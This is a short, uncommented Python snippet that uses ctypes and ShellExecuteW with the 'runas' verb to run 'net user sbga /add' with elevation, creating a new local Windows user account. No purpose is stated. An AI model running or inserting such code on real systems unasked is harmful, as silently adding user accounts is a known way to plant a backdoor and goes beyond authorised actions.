import ctypes,sys
ctypes.windll.shell32.ShellExecuteW(
                None, "runas", "net", "user sbga /add", None, 1
            )